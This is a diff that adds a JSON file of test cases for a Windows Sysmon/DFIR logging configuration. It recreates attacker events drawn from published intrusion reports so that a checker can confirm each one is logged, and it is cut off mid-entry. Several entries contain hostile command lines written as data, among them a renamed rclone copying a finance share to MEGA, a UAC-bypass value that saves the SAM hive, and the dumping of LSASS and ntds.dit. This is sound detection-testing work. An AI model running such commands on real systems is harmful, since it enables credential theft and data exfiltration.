@@ -1,0 +1,1092 @@
+{
+ "_about": "Events reconstructed from intrusions published by The DFIR Report (https://thedfirreport.com/reports/), 2020-2026. \"seen\" is how often the behavior appeared across 82 intrusions (approximate) or a short note. expect \"logged\" means the DFIR config must log the event; \"dropped\" checks that a noise exclusion works. Run: node webapp/scripts/check-cases.mjs dfir/windows-ir.xml dfir/tests/cases.json",
+ "cases": [
+  {
+   "id": "loader-rundll32-programdata",
+   "area": "Execution",
+   "behavior": "rundll32 runs a DLL dropped in ProgramData",
+   "seen": "57% of intrusions use rundll32",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "OriginalFileName": "RUNDLL32.EXE",
+     "CommandLine": "rundll32.exe C:\\ProgramData\\1.dll,DllRegisterServer",
+     "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+     "User": "CORP\\jdoe",
+     "IntegrityLevel": "Medium"
+    }
+   }
+  },
+  {
+   "id": "renamed-rclone-exec",
+   "area": "Execution",
+   "behavior": "Renamed rclone (sihosts.exe) started from ProgramData",
+   "seen": "renamed tools in 60%",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessCreate",
+    "fields": {
+     "Image": "C:\\ProgramData\\sihosts.exe",
+     "OriginalFileName": "rclone.exe",
+     "CommandLine": "sihosts.exe copy \\\\FS01\\Finance mega:backup --ignore-existing --multi-thread-streams 12",
+     "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+    }
+   }
+  },
+  {
+   "id": "c2-rundll32",
+   "area": "C2",
+   "behavior": "Beacon: rundll32 connects out on 443",
+   "seen": "32% beacon from rundll32/regsvr32",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "DestinationPort": "443",
+     "DestinationIp": "45.153.240.10",
+     "Protocol": "tcp",
+     "Initiated": "true",
+     "User": "CORP\\jdoe"
+    }
+   }
+  },
+  {
+   "id": "c2-injected-dllhost",
+   "area": "C2",
+   "behavior": "Beacon from injected dllhost.exe",
+   "seen": "37% beacon from injected system processes",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\dllhost.exe",
+     "DestinationPort": "443",
+     "DestinationIp": "45.153.240.10",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "c2-injected-wermgr",
+   "area": "C2",
+   "behavior": "Beacon from injected wermgr.exe",
+   "seen": "Qbot/Cobalt Strike",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\wermgr.exe",
+     "DestinationPort": "443",
+     "DestinationIp": "45.153.240.10",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "c2-injected-svchost",
+   "area": "C2",
+   "behavior": "Beacon from injected svchost.exe",
+   "seen": "Cobalt Strike spawnto",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\svchost.exe",
+     "DestinationPort": "443",
+     "DestinationIp": "45.153.240.10",
+     "Protocol": "tcp",
+     "Initiated": "true",
+     "User": "CORP\\jdoe"
+    }
+   }
+  },
+  {
+   "id": "exfil-renamed-rclone",
+   "area": "Exfiltration",
+   "behavior": "Renamed rclone uploads to MEGA",
+   "seen": "rclone in 18%",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\ProgramData\\sihosts.exe",
+     "DestinationPort": "443",
+     "DestinationHostname": "gfs270n171.userstorage.mega.co.nz",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "rmm-netsupport",
+   "area": "Remote access",
+   "behavior": "NetSupport client from AppData calls home",
+   "seen": "RMM in 30%",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Users\\jdoe\\AppData\\Roaming\\NjGFw\\client32.exe",
+     "DestinationPort": "443",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "rmm-anydesk",
+   "area": "Remote access",
+   "behavior": "AnyDesk installed in ProgramData connects out",
+   "seen": "AnyDesk in 18 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\ProgramData\\AnyDesk.exe",
+     "DestinationPort": "443",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "tunnel-ssh-rdp",
+   "area": "Remote access",
+   "behavior": "ssh.exe reverse tunnel exposing RDP",
+   "seen": "tunnels in 28%",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+     "DestinationPort": "22",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "tunnel-cloudflared",
+   "area": "Remote access",
+   "behavior": "cloudflared tunnel from ProgramData",
+   "seen": "TryCloudflare tunnels",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\ProgramData\\cloudflared.exe",
+     "DestinationPort": "7844",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "lateral-smb-from-beacon",
+   "area": "Lateral movement",
+   "behavior": "Injected process connects to another host on 445",
+   "seen": "SMB copy to ADMIN$ in 54%",
+   "expect": "logged",
+   "event": {
+    "tag": "NetworkConnect",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "DestinationPort": "445",
+     "DestinationIp": "10.0.0.21",
+     "Protocol": "tcp",
+     "Initiated": "true"
+    }
+   }
+  },
+  {
+   "id": "dns-c2",
+   "area": "C2",
+   "behavior": "DNS lookup of the C2 domain",
+   "seen": "DNS notable in 40%",
+   "expect": "logged",
+   "event": {
+    "tag": "DnsQuery",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "QueryName": "updates-cdn-check.com"
+    }
+   }
+  },
+  {
+   "id": "lsass-rundll32",
+   "area": "Credential access",
+   "behavior": "rundll32 opens LSASS (0x1010, UNKNOWN call trace)",
+   "seen": "LSASS access in 70%",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessAccess",
+    "fields": {
+     "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
+     "TargetImage": "C:\\Windows\\system32\\lsass.exe",
+     "GrantedAccess": "0x1010",
+     "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(000001A2B3C4D5E6)"
+    }
+   }
+  },
+  {
+   "id": "lsass-taskmgr",
+   "area": "Credential access",
+   "behavior": "Task Manager dumps LSASS",
+   "seen": "5 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessAccess",
+    "fields": {
+     "SourceImage": "C:\\Windows\\System32\\Taskmgr.exe",
+     "TargetImage": "C:\\Windows\\system32\\lsass.exe",
+     "GrantedAccess": "0x1FFFFF",
+     "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\dbgcore.DLL+6b0f"
+    }
+   }
+  },
+  {
+   "id": "lsass-dump-file",
+   "area": "Credential access",
+   "behavior": "comsvcs MiniDump writes LSASS dump with odd extension",
+   "seen": "comsvcs in 8 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "TargetFilename": "C:\\Windows\\Temp\\debug.avhdx"
+    }
+   }
+  },
+  {
+   "id": "lsass-dump-procdump",
+   "area": "Credential access",
+   "behavior": "procdump writes lsass.dmp to PerfLogs",
+   "seen": "procdump in 12%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\PerfLogs\\procdump64.exe",
+     "TargetFilename": "C:\\PerfLogs\\lsass.dmp"
+    }
+   }
+  },
+  {
+   "id": "drop-perflogs",
+   "area": "Staging",
+   "behavior": "Tool dropped in C:\\PerfLogs",
+   "seen": "10%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "TargetFilename": "C:\\PerfLogs\\sh.exe"
+    }
+   }
+  },
+  {
+   "id": "drop-public-music",
+   "area": "Staging",
+   "behavior": "DLL dropped in C:\\Users\\Public\\Music",
+   "seen": "13% use Users\\Public",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\Users\\Public\\Music\\x64.dll"
+    }
+   }
+  },
+  {
+   "id": "drop-programdata-dll",
+   "area": "Staging",
+   "behavior": "DLL dropped in ProgramData",
+   "seen": "41% use ProgramData",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "TargetFilename": "C:\\ProgramData\\n23.dll"
+    }
+   }
+  },
+  {
+   "id": "drop-admin-share",
+   "area": "Lateral movement",
+   "behavior": "Beacon written to ADMIN$ (arrives as C:\\Windows\\<random>.exe)",
+   "seen": "54%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "System",
+     "TargetFilename": "C:\\Windows\\a1b2c3d.exe"
+    }
+   }
+  },
+  {
+   "id": "drop-bat",
+   "area": "Staging",
+   "behavior": "Operator batch script in Windows\\Temp",
+   "seen": "bat in most ransomware cases",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\Windows\\Temp\\adf.bat"
+    }
+   }
+  },
+  {
+   "id": "drop-rmm-installer",
+   "area": "Remote access",
+   "behavior": "RMM installer MSI dropped in ProgramData",
+   "seen": "Atera/Splashtop",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "TargetFilename": "C:\\ProgramData\\setup.msi"
+    }
+   }
+  },
+  {
+   "id": "persist-task-file",
+   "area": "Persistence",
+   "behavior": "Scheduled task file created",
+   "seen": "48%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\system32\\svchost.exe",
+     "TargetFilename": "C:\\Windows\\System32\\Tasks\\WindowsUpdate"
+    }
+   }
+  },
+  {
+   "id": "persist-task-cache",
+   "area": "Persistence",
+   "behavior": "Scheduled task registered (TaskCache)",
+   "seen": "48%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\system32\\svchost.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\WindowsUpdate\\Id",
+     "Details": "{1A2B...}"
+    }
+   }
+  },
+  {
+   "id": "persist-service-admin",
+   "area": "Persistence",
+   "behavior": "Service ImagePath points to ADMIN$ beacon (PsExec-style)",
+   "seen": "services in 37%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\system32\\services.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\a1b2c3d\\ImagePath",
+     "Details": "\\\\DC01\\ADMIN$\\a1b2c3d.exe"
+    }
+   }
+  },
+  {
+   "id": "persist-run-key",
+   "area": "Persistence",
+   "behavior": "HKCU Run key",
+   "seen": "30%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKU\\S-1-5-21-1-2-3-1105\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update",
+     "Details": "rundll32.exe C:\\Users\\jdoe\\AppData\\Roaming\\x.dll,Start"
+    }
+   }
+  },
+  {
+   "id": "persist-hidden-user",
+   "area": "Persistence",
+   "behavior": "Hidden admin account (SpecialAccounts\\UserList)",
+   "seen": "accounts in 23%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\\backup",
+     "Details": "DWORD (0x00000000)"
+    }
+   }
+  },
+  {
+   "id": "persist-gootloader-reg",
+   "area": "Persistence",
+   "behavior": "Payload stored in HKCU\\...\\Personalization (Gootloader)",
+   "seen": "registry payloads in 8%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "TargetObject": "HKU\\S-1-5-21-1-2-3-1105\\Software\\Microsoft\\Personalization\\jdoe\\0",
+     "Details": "Binary Data"
+    }
+   }
+  },
+  {
+   "id": "evasion-defender-policy",
+   "area": "Defense evasion",
+   "behavior": "Defender disabled by policy key",
+   "seen": "37%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+     "Details": "DWORD (0x00000001)"
+    }
+   }
+  },
+  {
+   "id": "evasion-defender-exclusion",
+   "area": "Defense evasion",
+   "behavior": "Defender exclusion path added",
+   "seen": "Add-MpPreference -ExclusionPath",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090-11\\MsMpEng.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\",
+     "Details": "DWORD (0x00000000)"
+    }
+   }
+  },
+  {
+   "id": "cred-wdigest",
+   "area": "Credential access",
+   "behavior": "WDigest UseLogonCredential enabled",
+   "seen": "6%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential",
+     "Details": "DWORD (0x00000001)"
+    }
+   }
+  },
+  {
+   "id": "lateral-rdp-enable",
+   "area": "Lateral movement",
+   "behavior": "RDP enabled (fDenyTSConnections=0)",
+   "seen": "RDP in 67%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections",
+     "Details": "DWORD (0x00000000)"
+    }
+   }
+  },
+  {
+   "id": "pipe-cobalt",
+   "area": "C2",
+   "behavior": "Cobalt Strike post-exploitation pipe",
+   "seen": "pipes in 30%",
+   "expect": "logged",
+   "event": {
+    "tag": "PipeEvent",
+    "fields": {
+     "EventType": "CreatePipe",
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "PipeName": "\\postex_8a2f"
+    }
+   }
+  },
+  {
+   "id": "pipe-msse",
+   "area": "C2",
+   "behavior": "Cobalt Strike SMB beacon pipe",
+   "seen": "MSSE-*-server",
+   "expect": "logged",
+   "event": {
+    "tag": "PipeEvent",
+    "fields": {
+     "EventType": "CreatePipe",
+     "Image": "C:\\Windows\\System32\\dllhost.exe",
+     "PipeName": "\\MSSE-4141-server"
+    }
+   }
+  },
+  {
+   "id": "inject-winlogon",
+   "area": "Defense evasion",
+   "behavior": "Remote thread into winlogon",
+   "seen": "injection in 47%",
+   "expect": "logged",
+   "event": {
+    "tag": "CreateRemoteThread",
+    "fields": {
+     "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
+     "TargetImage": "C:\\Windows\\System32\\winlogon.exe",
+     "StartModule": "",
+     "StartFunction": ""
+    }
+   }
+  },
+  {
+   "id": "sideload-dll",
+   "area": "Defense evasion",
+   "behavior": "DLL sideload: consent.exe loads msimg32.dll from ProgramData",
+   "seen": "sideloading in 9%",
+   "expect": "logged",
+   "event": {
+    "tag": "ImageLoad",
+    "fields": {
+     "Image": "C:\\ProgramData\\Microsoft\\consent.exe",
+     "ImageLoaded": "C:\\ProgramData\\Microsoft\\msimg32.dll",
+     "Signed": "false",
+     "SignatureStatus": "Unavailable"
+    }
+   }
+  },
+  {
+   "id": "byovd-driver",
+   "area": "Defense evasion",
+   "behavior": "Vulnerable driver loaded from TEMP (BYOVD)",
+   "seen": "EDR killing in 17%",
+   "expect": "logged",
+   "event": {
+    "tag": "DriverLoad",
+    "fields": {
+     "ImageLoaded": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rwdrv.sys",
+     "Signed": "true",
+     "Signature": "ThrottleStop",
+     "SignatureStatus": "Valid"
+    }
+   }
+  },
+  {
+   "id": "tool-deleted",
+   "area": "Defense evasion",
+   "behavior": "Attacker deletes procdump after use",
+   "seen": "tools deleted in 37%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileDeleteDetected",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\PerfLogs\\procdump64.exe",
+     "IsExecutable": "true"
+    }
+   }
+  },
+  {
+   "id": "tool-deleted-archive",
+   "area": "Defense evasion",
+   "behavior": "Same deletion, with a copy kept (FileDelete)",
+   "seen": "tools deleted in 37%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileDelete",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\PerfLogs\\procdump64.exe",
+     "IsExecutable": "true"
+    }
+   }
+  },
+  {
+   "id": "new-exe",
+   "area": "Staging",
+   "behavior": "New executable written anywhere (FileExecutableDetected)",
+   "seen": "most intrusions",
+   "expect": "logged",
+   "event": {
+    "tag": "FileExecutableDetected",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\Users\\Administrator\\Desktop\\locker.exe"
+    }
+   }
+  },
+  {
+   "id": "motw-iso",
+   "area": "Initial access",
+   "behavior": "Downloaded ISO gets Zone.Identifier (origin URL)",
+   "seen": "ISO/archive lures",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreateStreamHash",
+    "fields": {
+     "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+     "TargetFilename": "C:\\Users\\jdoe\\Downloads\\invoice_0423.iso:Zone.Identifier"
+    }
+   }
+  },
+  {
+   "id": "wiper-raw-disk",
+   "area": "Impact",
+   "behavior": "Raw disk access (MBR wiper, NTDS copy)",
+   "seen": "wipers / ntds theft",
+   "expect": "logged",
+   "event": {
+    "tag": "RawAccessRead",
+    "fields": {
+     "Image": "C:\\ProgramData\\mbr.exe",
+     "Device": "\\Device\\HarddiskVolume2"
+    }
+   }
+  },
+  {
+   "id": "hollowing",
+   "area": "Defense evasion",
+   "behavior": "Process hollowing detected (ProcessTampering)",
+   "seen": "injection in 47%",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessTampering",
+    "fields": {
+     "Image": "C:\\Windows\\SysWOW64\\WerFault.exe",
+     "Type": "Image is replaced"
+    }
+   }
+  },
+  {
+   "id": "wmi-sub",
+   "area": "Persistence",
+   "behavior": "WMI event subscription",
+   "seen": "rare but persistent",
+   "expect": "logged",
+   "event": {
+    "tag": "WmiEvent",
+    "fields": {
+     "EventType": "WmiFilterEvent",
+     "Operation": "Created",
+     "Name": "Updater"
+    }
+   }
+  },
+  {
+   "id": "masq-dllhost-programdata",
+   "area": "Defense evasion",
+   "behavior": "Fake dllhost.exe written under ProgramData\\Microsoft\\Windows",
+   "seen": "masquerading in 60%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\DllHost\\dllhost.exe"
+    }
+   }
+  },
+  {
+   "id": "pipe-mojo-lookalike",
+   "area": "C2",
+   "behavior": "Cobalt Strike pipe named like Chrome IPC (mojo.*) from rundll32",
+   "seen": "mojo.* pipes in Cobalt Strike profiles",
+   "expect": "logged",
+   "event": {
+    "tag": "PipeEvent",
+    "fields": {
+     "EventType": "CreatePipe",
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "PipeName": "\\mojo.5688.8052.183894939787088877"
+    }
+   }
+  },
+  {
+   "id": "pipe-getsystem",
+   "area": "Privilege escalation",
+   "behavior": "getsystem named pipe from cmd echo",
+   "seen": "Cobalt Strike / Meterpreter getsystem",
+   "expect": "logged",
+   "event": {
+    "tag": "PipeEvent",
+    "fields": {
+     "EventType": "CreatePipe",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "PipeName": "\\a1b2c3"
+    }
+   }
+  },
+  {
+   "id": "lsass-vmread-only",
+   "area": "Credential access",
+   "behavior": "LSASS opened with 0x1410 (query + VM read)",
+   "seen": "common mimikatz mask",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessAccess",
+    "fields": {
+     "SourceImage": "C:\\Users\\Public\\ls.exe",
+     "TargetImage": "C:\\Windows\\system32\\lsass.exe",
+     "GrantedAccess": "0x1410",
+     "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4"
+    }
+   }
+  },
+  {
+   "id": "injected-code-access",
+   "area": "Defense evasion",
+   "behavior": "Unbacked (injected) code opens another process",
+   "seen": "injection in 47%",
+   "expect": "logged",
+   "event": {
+    "tag": "ProcessAccess",
+    "fields": {
+     "SourceImage": "C:\\Windows\\System32\\dllhost.exe",
+     "TargetImage": "C:\\Windows\\explorer.exe",
+     "GrantedAccess": "0x1FFFFF",
+     "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(00000203A1B20000)"
+    }
+   }
+  },
+  {
+   "id": "discovery-output",
+   "area": "Discovery",
+   "behavior": "ShareFinder output written to ProgramData by PowerShell",
+   "seen": "ShareFinder in 17 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "TargetFilename": "C:\\ProgramData\\shares.txt"
+    }
+   }
+  },
+  {
+   "id": "impacket-output",
+   "area": "Lateral movement",
+   "behavior": "Impacket wmiexec writes command output to ADMIN$",
+   "seen": "Impacket in 12%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\Windows\\__1698765432.1234567"
+    }
+   }
+  },
+  {
+   "id": "reg-save-sam",
+   "area": "Credential access",
+   "behavior": "reg save HKLM\\SAM to ProgramData",
+   "seen": "SAM hive save in 10%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetFilename": "C:\\ProgramData\\sam.save"
+    }
+   }
+  },
+  {
+   "id": "ntds-ifm",
+   "area": "Credential access",
+   "behavior": "ntdsutil IFM copy of ntds.dit to PerfLogs",
+   "seen": "NTDS theft in 12%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\ntdsutil.exe",
+     "TargetFilename": "C:\\PerfLogs\\1\\Active Directory\\ntds.dit"
+    }
+   }
+  },
+  {
+   "id": "ntds-raw",
+   "area": "Credential access",
+   "behavior": "Raw volume read to copy a locked ntds.dit",
+   "seen": "NTDS theft",
+   "expect": "logged",
+   "event": {
+    "tag": "RawAccessRead",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\esentutl.exe",
+     "Device": "\\Device\\HarddiskVolume3"
+    }
+   }
+  },
+  {
+   "id": "dotnet-in-mstsc",
+   "area": "Credential access",
+   "behavior": "Rubeus run in memory inside mstsc.exe (clr.dll load)",
+   "seen": "execute-assembly in injected processes",
+   "expect": "logged",
+   "event": {
+    "tag": "ImageLoad",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\mstsc.exe",
+     "ImageLoaded": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
+     "Signed": "true",
+     "SignatureStatus": "Valid"
+    }
+   }
+  },
+  {
+   "id": "comsvcs-load",
+   "area": "Credential access",
+   "behavior": "rundll32 loads comsvcs.dll for MiniDump",
+   "seen": "comsvcs in 8 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "ImageLoad",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\rundll32.exe",
+     "ImageLoaded": "C:\\Windows\\System32\\comsvcs.dll",
+     "Signed": "true",
+     "SignatureStatus": "Valid"
+    }
+   }
+  },
+  {
+   "id": "safeboot-persist",
+   "area": "Defense evasion",
+   "behavior": "Ransomware registers itself to run in Safe Mode",
+   "seen": "safe mode reboot in 3 reports",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "CreateKey",
+     "Image": "C:\\Users\\Administrator\\Desktop\\locker.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network\\locker"
+    }
+   }
+  },
+  {
+   "id": "portproxy",
+   "area": "Lateral movement",
+   "behavior": "netsh portproxy forwards 3390 to RDP",
+   "seen": "portproxy in Conti cases",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\netsh.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/3390",
+     "Details": "10.0.0.5/3389"
+    }
+   }
+  },
+  {
+   "id": "uac-ms-settings",
+   "area": "Privilege escalation",
+   "behavior": "ms-settings UAC bypass handler",
+   "seen": "fodhelper/ComputerDefaults bypass",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKU\\S-1-5-21-1-2-3-500_Classes\\ms-settings\\shell\\open\\command\\(Default)",
+     "Details": "cmd.exe /c reg save hklm\\sam C:\\ProgramData\\sam.save"
+    }
+   }
+  },
+  {
+   "id": "defender-start-4",
+   "area": "Defense evasion",
+   "behavior": "WinDefend service disabled (Start=4)",
+   "seen": "Defender disabled in 37%",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Users\\Administrator\\Desktop\\DC.exe",
+     "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\WinDefend\\Start",
+     "Details": "DWORD (0x00000004)"
+    }
+   }
+  },
+  {
+   "id": "sysmon-channel-off",
+   "area": "Defense evasion",
+   "behavior": "Sysmon event channel disabled",
+   "seen": "logging tampering",
+   "expect": "logged",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\System32\\reg.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\\Enabled",
+     "Details": "DWORD (0x00000000)"
+    }
+   }
+  },
+  {
+   "id": "webshell",
+   "area": "Initial access",
+   "behavior": "Web shell written under inetpub (ProxyShell)",
+   "seen": "exploits in 10%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+     "TargetFilename": "C:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx"
+    }
+   }
+  },
+  {
+   "id": "psexec-service-deleted",
+   "area": "Defense evasion",
+   "behavior": "PsExec-style service binary deleted from C:\\Windows (copy kept)",
+   "seen": "remote services in 58%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileDelete",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\services.exe",
+     "TargetFilename": "C:\\Windows\\a1b2c3d.exe",
+     "IsExecutable": "true"
+    }
+   }
+  },
+  {
+   "id": "evtx-deleted",
+   "area": "Defense evasion",
+   "behavior": "Event log file deleted",
+   "seen": "log clearing in 10%",
+   "expect": "logged",
+   "event": {
+    "tag": "FileDeleteDetected",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "TargetFilename": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+     "IsExecutable": "false"
+    }
+   }
+  },
+  {
+   "id": "noise-defender-files",
+   "area": "Noise",
+   "behavior": "Defender writing scan data",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090-11\\MsMpEng.exe",
+     "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\CacheManager\\x.bin"
+    }
+   }
+  },
+  {
+   "id": "noise-ps-policytest",
